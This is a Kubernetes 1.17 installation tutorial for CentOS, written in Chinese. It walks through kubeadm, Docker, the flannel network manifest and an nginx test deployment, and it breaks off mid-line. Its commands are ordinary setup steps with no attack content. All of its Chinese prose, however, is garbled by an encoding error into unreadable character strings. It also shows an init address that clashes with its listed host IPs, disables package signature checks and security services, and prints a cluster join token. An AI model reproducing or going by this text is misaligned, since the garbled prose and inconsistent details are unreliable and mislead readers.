éç¾¤ä¸­æææºå¨ä¹é´ç½ç»äºé\n * å¯ä»¥è®¿é®å¤ç½ï¼éè¦æåéå\n * ç¦æ­¢ swap ååº\n\n\n# 1.5 æç»ç®æ \n\n * å¨ææèç¹ä¸å®è£ Docker å kubeadm\n * é¨ç½² Kubernetes Master\n * é¨ç½²å®¹å¨ç½ç»æä»¶\n * é¨ç½² Kubernetes Nodeï¼å°èç¹å å¥ Kubernetes éç¾¤ä¸­\n * é¨ç½² Dashboard Web é¡µé¢ï¼å¯è§åæ¥ç Kubernetes èµæº\n\n\n# 2 å®è£é¨ç½²\n\n\n\nè§è²       HOSTNAME   IP               ç»ä»¶\nmaster   node101    192.168.81.101   dockerï¼kubectlï¼kubeadmï¼kubelet\nnode1    node102    192.168.81.102   dockerï¼kubectlï¼kubeadmï¼kubelet\nnode2    node103    192.168.81.103   dockerï¼kubectlï¼kubeadmï¼kubelet\n\n> ä»¥ä¸æ²¡æç¹å®è¯´æå¨ Master è¿æ¯ Node ä¸æä½ï¼é»è®¤å¨é¨èç¹éè¦æä½ã\n\n\n# 2.1 hostname åè§£æ\n\nä¸ç®¡æ­å»ºè®¾ä»ä¹éç¾¤ï¼åè®°è®¾ç½®å¥½ hostnameï¼æ¯è¾æ¹ä¾¿ãä¸¤ä¸ªæ­¥éª¤å®æè®¾ç½®ï¼\n\n 1. ä¸´æ¶è®¾ç½®ãhostname èç¹åç§°\n 2. vim /etc/hostname\n\nè®¾ç½®å®æåè¦æ·»å è§£æ hostname ä¸»æºåç IP æ å°ï¼vim /etc/hosts ç´æ¥ä¿®æ¹\n\n192.168.81.101  node101\n192.168.81.102  node102\n192.168.81.103  node103  \n\n\n1\n2\n3\n\n\nhostname node101\n\nvim /etc/hostname\nnode101\n\n\n1\n2\n3\n4\n\n\n\n# 2.2 æ¶é´åæ­¥\n\nKubernetes è¦æ±æ®ç¾¤ä¼çèç¹æ¶é´å¿é¡»ç²¾ç¡®ä¸è´ï¼è¿éç´æ¥ä½¿ç¨ chronyd æå¡ä»ç½ç»åæ­¥æ¶é´ãä¼ä¸ä¸­å»ºè®®éç½®åé¨çæ¶é´åæ­¥æå¡å¨ã\n\n# å¯å¨chronydæå¡\nsystemctl start chronyd\n# è®¾ç½®chronydæå¡å¼æºèªå¯å¨\nsystemctl enable chronyd\n# chronyd æå¡å¯å¨ç¨ç­å ç§éï¼å°±å¯ä»¥ä½¿ç¨dataå½ä»¤éªè¯æ¶é´äº\ndate\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.3 ç¦ç¨ iptables å firewalld æå¡\n\nKubernetes å docker å¨è¿è¡ä¸­ä¼äº§çå¤§éç iptables è§åï¼ä¸ºäºä¸è®©ç³»ç»è§åè·ä»ä»¬æ··æ·ï¼ç´æ¥å³é­ç³»ç»çè§åï¼çäº§ç³»ç»å»ºè®®å¼å¯ï¼éè¦å¼æ¾åªäºç«¯å£æè IPï¼æå¨éç½®ã\n\n# å³é­ firewalld æå¡\nsystemctl stop firewalld\nsystemctl disable firewalld\n# å³é­iptanlesæå¡\nsystemctl stop iptables\nsystemctl disable iptables\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.4 ç¦ç¨ selinux\n\nselinux æ¯ linux ç³»ç»ä¸çä¸ä¸ªå®å¨æå¡ï¼å¦æä¸å³é­å®ï¼å¨å®è£éç¾¤ä¸­å¯è½ä¼è¢«éå¶\n\n# ä¸´æ¶å³é­\nsetenforce 0\n# æ°¸ä¹ç¦ç¨\nvim /etc/selinux/config\nSELINUX=disabled\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.5 ç¦ swap ç¨ååº\n\nswap ååºæçæ¯èæåå­ååºï¼å®çä½ç¨æ¯å¨ç©çåå­ä½¿ç¨å®ä¹åï¼å°ç£çç©ºé´èææåå­æ¥ä½¿ç¨ï¼å¯ç¨ swap è®¾å¤ä¼å¯¹ç³»ç»çæ§è½äº§çéå¸¸è´é¢çå½±åï¼å æ­¤ Kubernetes è¦æ±æ¯ä¸ªèç¹é½è¦ç¦ç¨ swap è®¾å¤ï¼ä½æ¯å¦æå ä¸ºæäºåå ç¡®å®ä¸è½å³é­ swap ååºï¼å°±éè¦å¨éç¾¤å®è£çè¿ç¨ä¸­éè¿æç¡®çåæ°è¿è¡éç½®è¯´æã\n\n# ä¸´æ¶å³é­\nswapoff -a\n\n# æ°¸ä¹å³é­ï¼ç¼è¾ååºéç½®æä»¶ /etc/fstabï¼æ³¨éæ wap ååºä¸è¡\n#/dev/mapper/centos-swap swap                    swap    defaults        0 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.6 ä¿®æ¹ linxu çåæ ¸åæ°\n\n# ä¿®æ¹linuxçåæ ¸åæ°ï¼æ·»å ç½æ¡¥è¿æ»¤åå°åè½¬ååè½\n# ç¼è¾ /etc/sysctl.d/k8s.conf æä»¶ï¼æ·»å å¦ä¸éç½®ï¼\nnet.bridge.bridge-nf-call-iptables=1\nnet.bridge.bridge-nf-call-ip6tables=1\nnet.ipv4.ip_forward=1\nnet.ipv4.tcp_tw_recycle=0\nvm.swappiness=0\nvm.overcommit_memory=1\nvm.panic_on_oom=0\nfs.inotify.max_user_watches=89100\nfs.file-max=52706963\nfs.nr_open=52706963\nnet.ipv6.conf.all.disable_ipv6=1\nnet.netfilter.nf_conntrack_max=2310720\n\n# å è½½ç½æ¡¥è¿æ»¤æ¨¡å\nmodprobe br_netfilter\nmodprobe ip_conntrack\n# éç½®å®æåéæ°å è½½éç½®æä»¶\nsysctl -p /etc/sysctl.d/k8s.conf\n# æ¥çç½æ¡¥è¿æ»¤æ¨¡åæ¯å¦æ·»å æå\nlsmod | grep br_netfilter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.7 éç½® ipvs\n\nå¨ Kubernetes ä¸­ service æä¸¤ç§ä»£çæ¨¡åï¼ä¸ç§æ¯åºäº iptables çï¼ä¸ç§æ¯åºäº ipvs çï¼ä¸¤èæ¯è¾çè¯ï¼ipvs çæ§è½ææ¾æ´è¦é«ä¸äºï¼ä½æ¯å¦æè¦ä½¿ç¨å®ï¼éè¦æå¨è½½å¥ ipvs æ¨¡å\n\n# å®è£ ipset å ipvsadm \nyum install ipset ipvsadm -y\n\n# æ·»å éè¦å è½½å¾æ¨¡ååå¥èæ¬æä»¶\ncat <<EOF > /etc/sysconfig/modules/ipvs.modules\n#!/bin/bash\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack_ipv4\nmodprobe -- br_netfilter\nEOF\n\n# ä¸ºèæ¬æä»¶æ·»å æ§è¡æé\nchmod +x /etc/sysconfig/modules/ipvs.modules\n\n# æ§è¡èæ¬æä»¶\n/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n# æ¥çå¯¹åºå¾æ¨¡åæ¯å¦å è½½æå\nlsmod | grep -e ip_vs -e nf_conntrack_ipv4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.8 docker å®è£\n\n# ä¹åå®è£è¿docker å¸è½½\nyum remove docker-*\n\n# æ´æ¢éåå°å\nwget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo\n\n# æ£æ¥æ¯æçæ¬\nyum list docker-ce --showduplicates | sort -r\n\n# å®è£\nyum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7\n\n# æ·»å ä¸ä¸ªéç½®æä»¶ï¼dockerå¨é»è®¤æåµä¸ä½¿ç¨çCgroup Driverä¸ºcgroupfsï¼èkubernetesæ¨èä½¿ç¨systemdæ¥ä»£æ¿cgroupfs\ncat > /etc/docker/daemon.json <<EOF\n{\n  "registry-mirrors": ["https://bk6kzfqm.mirror.aliyuncs.com"],\n  "data-root": "/data/docker",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "log-driver": "json-file",\n  "log-opts": {\n    "max-size": "100m"\n  },\n  "storage-driver": "overlay2",\n  "storage-opts": [\n    "overlay2.override_kernel_check=true"\n  ]\n}\nEOF\n\n# å¯å¨docker\nsystemctl restart docker\nsystemctl enable docker\n\n#æ£æ¥çæ¬\ndocker version\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 2.9 å®è£ kubernetes ç»ä»¶\n\nç±äº Kubernetes çéåæºå¨å½å¤ï¼éåº¦æ¯è¾æ¢ï¼è¿éåæ¢æå½åçéåæº\n\n# æ·»å éç½®æä»¶\nvim /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå®è£ kubeadmãkubelet å kubectl\n\nyum install --setopt=obsoletes=0 kubeadm-1.17.4-0 kubelet-1.17.4-0 kubectl-1.17.4-0\n\n\n1\n\n\nè®¾ç½® kubelet å¼æºèªå¯å¨\n\nsystemctl enable kubelet\n\n\n1\n\n\n\n# 2.10 éç¾¤åå§å\n\n# åå¤éå\n\nkubeadm config images list\n\nimages=(\n    kube-apiserver:v1.17.4\n    kube-controller-manager:v1.17.4\n    kube-scheduler:v1.17.4\n    kube-proxy:v1.17.4\n    pause:3.1\n    etcd:3.4.3-0\n    coredns:1.6.5\n)\n\n\nfor imageName in ${images[@]} ;do\n    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName\n    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageName\n    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName\ndone\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå§å\n\nå¨ Master ç¹æä½å¦ä¸\n\nkubeadm init \\\n  --kubernetes-version=v1.17.4 \\\n  --pod-network-cidr=10.244.0.0/16 \\\n  --service-cidr=10.96.0.0/12  \\\n  --apiserver-advertise-address=10.240.30.113\n\n\n1\n2\n3\n4\n5\n\n * kubernetes-version ä¸ºçæ¬\n * pod-network-cidr æå® pod ç½ç»\n * service-cidr æå® service ç½ç»\n * apiserver-advertise-address æå® master ç IP å°å\n * image-repository registry.aliyuncs.com/google_containers æå®éåæºä¸ºé¿éï¼åé¢å·²ç»æåè¿éåäºï¼æä»¥ä¸éè¦å¨æ\n\n# å®è£è¿ç¨ä¸­æ¥éå¦ææ¥éï¼æ¥çæ¥å¿\njournalctl -xfeu kubelet\n\n# éç½® kubeadm çä¿¡æ¯\nkubeadm reset\n\n\n1\n2\n3\n4\n5\n\n\nå¨ Master ç¹åå»ºå¿è¦çæä»¶ï¼æ¯ kubectl ä»¥åè¦æ§è¡çéç½®æä»¶\n\n  mkdir -p $HOME/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\n  sudo chown $(id -u):$(id -g) $HOME/.kube/config\n\n\n1\n2\n3\n\n\nå¶ä»å­èç¹æ§è¡ï¼å®è£æååä¼æä¿¡æ¯åè¯ä½ \n\nkubeadm join 192.168.81.101:6443 --token d5ejth.9s60snjt5xlh9lnt \\\n    --discovery-token-ca-cert-hash sha256:04aab4993001f66f607e959b120294eddcc8579a5ea7d7364f48d84caecc90c9\n\n\n1\n2\n\n\næ¥çææèç¹\n\nkubectl get nodes\n\n\n1\n\n\n\n# 2.11 å®è£ç½ç»æä»¶\n\nkubernetes æ¯æå¤ç§ç½ç»æä»¶ï¼æ¯å¦ flannelãcalicoãcanal ç­ç­ï¼ä»»éä¸ç§ä½¿ç¨å³å¯ï¼æ¬æ¬¡éæ© flannel\n\n# master æä½\n\nåå»ºæä»¶ï¼å¤å¶æ§åå®¹å°æä»¶ä¸­\n\ncat <<EOF > kube-flannel.yml\n---\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: psp.flannel.unprivileged\n  annotations:\n    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default\n    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default\n    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default\n    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/default\nspec:\n  privileged: false\n  volumes:\n    - configMap\n    - secret\n    - emptyDir\n    - hostPath\n  allowedHostPaths:\n    - pathPrefix: "/etc/cni/net.d"\n    - pathPrefix: "/etc/kube-flannel"\n    - pathPrefix: "/run/flannel"\n  readOnlyRootFilesystem: false\n  # Users and groups\n  runAsUser:\n    rule: RunAsAny\n  supplementalGroups:\n    rule: RunAsAny\n  fsGroup:\n    rule: RunAsAny\n  # Privilege Escalation\n  allowPrivilegeEscalation: false\n  defaultAllowPrivilegeEscalation: false\n  # Capabilities\n  allowedCapabilities: [\'NET_ADMIN\']\n  defaultAddCapabilities: []\n  requiredDropCapabilities: []\n  # Host namespaces\n  hostPID: false\n  hostIPC: false\n  hostNetwork: true\n  hostPorts:\n  - min: 0\n    max: 65535\n  # SELinux\n  seLinux:\n    # SELinux is unused in CaaSP\n    rule: \'RunAsAny\'\n---\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nrules:\n  - apiGroups: [\'extensions\']\n    resources: [\'podsecuritypolicies\']\n    verbs: [\'use\']\n    resourceNames: [\'psp.flannel.unprivileged\']\n  - apiGroups:\n      - ""\n    resources:\n      - pods\n    verbs:\n      - get\n  - apiGroups:\n      - ""\n    resources:\n      - nodes\n    verbs:\n      - list\n      - watch\n  - apiGroups:\n      - ""\n    resources:\n      - nodes/status\n    verbs:\n      - patch\n---\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: flannel\nsubjects:\n- kind: ServiceAccount\n  name: flannel\n  namespace: kube-system\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: flannel\n  namespace: kube-system\n---\nkind: ConfigMap\napiVersion: v1\nmetadata:\n  name: kube-flannel-cfg\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\ndata:\n  cni-conf.json: |\n    {\n      "name": "cbr0",\n      "cniVersion": "0.3.1",\n      "plugins": [\n        {\n          "type": "flannel",\n          "delegate": {\n            "hairpinMode": true,\n            "isDefaultGateway": true\n          }\n        },\n        {\n          "type": "portmap",\n          "capabilities": {\n            "portMappings": true\n          }\n        }\n      ]\n    }\n  net-conf.json: |\n    {\n      "Network": "10.244.0.0/16",\n      "Backend": {\n        "Type": "vxlan"\n      }\n    }\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - amd64\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n            add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-arm64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - arm64\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-arm\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - arm\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-ppc64le\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - ppc64le\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-s390x\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - s390x\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\nEOF\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n372\n373\n374\n375\n376\n377\n378\n379\n380\n381\n382\n383\n384\n385\n386\n387\n388\n389\n390\n391\n392\n393\n394\n395\n396\n397\n398\n399\n400\n401\n402\n403\n404\n405\n406\n407\n408\n409\n410\n411\n412\n413\n414\n415\n416\n417\n418\n419\n420\n421\n422\n423\n424\n425\n426\n427\n428\n429\n430\n431\n432\n433\n434\n435\n436\n437\n438\n439\n440\n441\n442\n443\n444\n445\n446\n447\n448\n449\n450\n451\n452\n453\n454\n455\n456\n457\n458\n459\n460\n461\n462\n463\n464\n465\n466\n467\n468\n469\n470\n471\n472\n473\n474\n475\n476\n477\n478\n479\n480\n481\n482\n483\n484\n485\n486\n487\n488\n489\n490\n491\n492\n493\n494\n495\n496\n497\n498\n499\n500\n501\n502\n503\n504\n505\n506\n507\n508\n509\n510\n511\n512\n513\n514\n515\n516\n517\n518\n519\n520\n521\n522\n523\n524\n525\n526\n527\n528\n529\n530\n531\n532\n533\n534\n535\n536\n537\n538\n539\n540\n541\n542\n543\n544\n545\n546\n547\n548\n549\n550\n551\n552\n553\n554\n555\n556\n557\n558\n559\n560\n561\n562\n563\n564\n565\n566\n567\n568\n569\n570\n571\n572\n573\n574\n575\n576\n577\n578\n579\n580\n581\n582\n583\n584\n585\n586\n587\n588\n589\n590\n591\n592\n593\n594\n595\n596\n597\n598\n599\n600\n601\n602\n603\n604\n\n\næ§è¡ä»¥ä¸å½ä»¤\n\nkubectl apply -f kube-flannel.yml \n\n\n1\n\n\næ¥çèç¹ç¶æï¼åªè¦ä» NotReady å° Ready å°±ç®æå\n\n\n# æå¡é¨ç½²\n\né¨ç½²ä¸ä¸ª nginx ç¨åºï¼æµè¯ä¸éç¾¤æ¯å¦å¨æ­£å¸¸å·¥ä½ï¼ç´æ¥å¨ master æä½\n\n# é¨ç½²nginx\nkubectl create deployment nginx --image=nginx:1.14-alpine\n# æ´é²ç«¯å£\nkubectl expose deployment nginx --port=80 --type=NodePort\n\n# æ¥çæå¡ç¶æ\n[root@localhost package]# kubectl get pods,svc\nNAME                         READY   STATUS    RESTARTS   AGE\npod/nginx-6867cdf567-2l7tr   1/1     Running   0          50s\n\nNAME                 TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE\nservice/kubernetes   ClusterIP   10.96.0.1        <none>        443/TCP        71m\nservice/nginx        NodePort    10.101.119.180   